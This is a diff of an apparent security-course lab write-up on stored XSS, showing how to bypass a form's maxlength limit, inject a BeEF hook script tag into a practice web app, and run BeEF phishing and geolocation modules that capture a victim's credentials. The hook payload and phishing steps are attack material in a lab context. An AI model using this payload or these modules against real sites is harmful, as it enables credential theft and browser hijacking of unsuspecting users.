@@ -130,98 +130,48 @@ Start the `Terminal` in your Virtual Machine.
 
 #### 4. Inject this payload  
   - When trying to inject the payload there was an issue found, in the message box field, there was a limit of `maxlength="50"` character in the source code. Therefore we could not inject the payload.
-  ![maxlength=50]()
-
-
-2. The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.      
-
-   - While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.
+  ![maxlength=50](/Images/XSS-S--maxlength-50ch.PNG)
   
-   - An attacker takes a small snippet of code, called a BeEF Hook, and determines a way to add this code into a target website. This is commonly done by cross-site scripting.
-
-   - When subsequent users access the infected website, the users' browsers become *hooked*.
-     - Once a browser is hooked, it is referred to as a **zombie**. A zombie is an infected browser that awaits instructions from the BeEF control panel.
-     - The BeEF control panel has hundreds of exploits that can be launch against the *hooked* victims, including:
-       - Social engineering attacks 
-       - Stealing confidential data from the victim's machine
-       - Accessing system and network information from the victim's machine
-       
-3. BeEF includes a feature to test out a simulation of an infected website.
-    
-    - To access this simulated infected website, locate the following sentence on the BeEF control panel: `To begin with, you can point a browser towards the basic demo page here, or the advanced version here.`
-    
-    - Click the second "here" to access the advanced version.  
-     
-       ![wd_hw13](Images/wd_hw13.png)
-
-    - This will open the following website, which has been infected with a BeEF hook.
-
-       ![wd_hw14](Images/wd_hw14.png)
-
-    - Note that once you have pulled up this infected webpage, your browser has now been hooked!
-
-    	- If your browser has not been hooked, restart your browser and try again.
-
-    -  Return to the control panel. On the left side, you can notice that your browser has become infected since accessing the infected Butcher website. Note that if multiple browsers become infected they will all be listed individually on the left hand side of this panel.
-
-      - Click on the browser `127.0.0.1` as indicated in the screenshot below.
-
-        ![wd_hw15](Images/wd_hw15.png)
-
-      - Under the Details tab, we can see information about the infected browser. 
-
-4. Now we are ready to test an exploit.
-
-    - Select the Commands tabs. 
-    
-      - This will list folders of hundreds of exploits that can be ran against the hooked browser. Note that many may not work, as they are dependent on the browser and security settings enabled.
+  - Solution: From the Browser press `Ctrl+Shift+I` for Developer Tools. Under the `Element` in Chrome or `Inspector` in Firefox locate the `<div class="body_padded">` and in sub categories, locate the `<textarea name="mtxMessage" cols="50" rows="3" maxlength="50">`. Change the maxlength to any number greater than 50, for example `maxlength="75"`, or just remove this code limit.
+  ![maxlength=75](/Images/XSS-S--maxlength-75ch.PNG)  
   
-   - First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
-     
-   - To access this exploit, select Google Phishing under Social Engineering.
 
+#### 5. A few BeEF exploits.
+  - First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
+  - To access this exploit, select `Google Phishing` under `Social Engineering`.
        ![wd_hw16](Images/wd_hw16.png)
-
-   - After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.
-
+  - After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.
        ![wd_hw17](Images/wd_hw17.png)
-
-   - To launch the exploit, select Execute in the bottom right corner.
-
-     - After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.
-
-     - A victim could easily mistake this for a real login prompt.
-
-   - Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page. 
-     - Username: `hackeruser`
-     - Password: `hackerpass`
-
-       ![wd_hw18](Images/wd_hw18.png)
-
-   - Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.
-
-     ![wd_hw19](Images/wd_hw19.png)
-
-5. Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.
+  - To launch the exploit, select Execute in the bottom right corner.
+  - After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.
+  - A victim could easily mistake this for a real login prompt.
+  - Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page. 
+    - Username: `hackeruser`  
+    - Password: `hackerpass`  
+      ![wd_hw18](Images/wd_hw18.png)  
+  - Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.  
+      ![wd_hw19](Images/wd_hw19.png)  
 
    - Task details:
      - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
      - The BeEF hook, which was returned after running the `sudo beef` command was: `http://127.0.0.1:3000/hook.js`
      - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`
 
-   -  When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.    
-      
-      - **Hint:** Try right-clicking and selecting "Inspecting the Element".
+  - Social Engineering >> Pretty Theft
+    ![Pretty Theft Facebook](/Images/Social-Engineering-Pretty-Theft-1.PNG)  
+    ![Pretty Theft LinkedIn](/Images/Social-Engineering-Pretty-Theft-2.PNG)  
+    ![Pretty Theft Microsoft Windows](/Images/Social-Engineering-Pretty-Theft-3.PNG)  
+
+  - Social Engineering >> Fake Notification Bar
+    ![Social Engineering >> Fake Notification Bar](/Images/Social-Engineering-Fake-Notification-Bar.PNG)  
     
-   - Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:
-     
-     - Social Engineering >> Pretty Theft
-     
-     - Social Engineering >> Fake Notification Bar
-     
-     - Host >> Get Geolocation (Third Party)
+  - Host >> Get Geolocation (Third Party)
+    ![Host >> Get Geolocation (Third Party)](/Images/Host-Get-Geolocation-Third-Party.PNG)  
     
-6. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 
+### ***Recommended Mitigation Strategies***  
+-------------------------------------------
+> Keep the system up to date
+> Restore the VM to a virgin state on a regular basis (once a week, or once a month). Also change your passwords regularly, assuming that you have been compromised.
 
 ---
 
